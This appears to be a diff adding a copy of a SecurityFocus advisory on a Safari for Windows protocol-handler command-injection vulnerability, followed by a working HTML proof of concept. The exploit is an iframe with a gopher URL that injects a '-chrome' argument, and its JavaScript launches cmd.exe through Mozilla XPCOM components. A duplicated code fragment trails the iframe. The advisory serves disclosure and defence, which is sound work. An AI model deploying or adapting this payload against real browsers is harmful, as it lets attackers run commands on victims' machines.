@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/24434/info
+
+Apple Safari for Windows is prone to a protocol handler command-injection vulnerability.
+
+Exploiting the issue allows remote attackers to pass arbitrary command-line arguments to any application that can be called through a protocol handler.
+
+This specific vulnerability relies on the use of IFRAME elements; attackers can do even more damage by combining it with Mozilla XPCOM components.
+
+Exploiting the issue would permit a remote attacker to influence command options that can be called through Safari protocol handlers and to compromise affected systems in the context of the vulnerable user.
+
+This issue may be related to the vulnerability discussed in BID 10406 (Apple MacOS X SSH URI Handler Remote Code Execution Vulnerability). We will update this BID as more information emerges.
+
+Note: Apple has released Safari for Windows Beta 3.0.1 
+
+<html><body>
+<iframe src='gopher://example.com" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[&#39;@mozilla.org/file/local;1&#39;].createInstance(I.nsILocalFile);file.initWithPath(&#39;C:&#39;+String.fromCharCode(92)+String.fromCharCode(92)+&#39;Windows&#39;+String.fromCharCode(92)+String.fromCharCode(92)+&#39;System32&#39;+String.fromCharCode(92)+String.fromCharCode(92)+&#39;cmd.exe&#39;);process=C[&#39;@mozilla.org/process/util;1&#39;].createInstance(I.nsIProcess);process.init(file);process.run(true&#44;{}&#44;0);alert(process)'></iframe>process.init(file);process.run(true,{},0);alert(process)
+</body></html>
